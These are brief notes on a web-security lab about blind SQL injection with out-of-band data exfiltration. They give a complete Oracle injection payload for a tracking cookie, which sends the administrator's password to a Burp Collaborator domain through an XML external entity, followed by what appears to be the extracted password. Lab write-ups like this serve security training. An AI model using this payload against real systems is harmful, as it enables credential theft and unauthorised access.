Lab #16 - Blind SQL injection with out of band data exfiltration

Vulnerable parameter - tracking cookie

End Goals:
1) Exploit SQLi to output the password of the administrator user
2) Login as the administrator user

Analysis:
akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net


' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password from users where username='administrator')||'.akyjt827n6zbq7z8zvtfg6bft6zwnl.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)-- 

0fpkzao19uq428v3bbde